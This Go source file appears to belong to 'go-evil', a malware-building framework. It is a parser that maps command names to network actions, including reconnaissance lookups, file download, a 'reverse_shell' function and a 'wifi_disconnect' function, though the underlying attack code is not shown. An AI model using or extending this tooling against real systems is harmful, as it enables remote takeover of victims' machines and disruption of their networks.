package network

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/domains/network/dns"
	"github.com/TeamPhoneix/go-evil/domains/network/download"
	"github.com/TeamPhoneix/go-evil/domains/network/interfaces"
	"github.com/TeamPhoneix/go-evil/domains/network/ip"
	"github.com/TeamPhoneix/go-evil/domains/network/network"

	"github.com/s9rA16Bf4/notify_handler/go/notify"
)

// The main parser for the Infect domain
func Parser(function string, value string, s_json string) ([]string, string) {
	call := []string{}

	switch function {
	case "ping":
		call, s_json = network.Ping(value, s_json)

	case "get_local_ip":
		call, s_json = ip.Get_local(value, s_json)

	case "get_global_ip":
		call, s_json = ip.Get_global(value, s_json)

	case "get_interface":
		call, s_json = interfaces.Get_interface(value, s_json)

	case "get_interfaces":
		call, s_json = interfaces.Get_interfaces(value, s_json)

	case "get_networks":
		call, s_json = network.Get(value, s_json)

	case "reverse_shell":
		call, s_json = network.Reverse_shell(value, s_json)

	case "download":
		call, s_json = download.Download(value, s_json)

	case "dns_lookup":
		call, s_json = dns.Lookup(value, s_json)

	case "wifi_disconnect":
		call, s_json = network.Wifi_disconnect(value, s_json)

	default:
		notify.Error(fmt.Sprintf("Unknown function '%s'", function), "network.Parser()")

	}

	return call, s_json
}
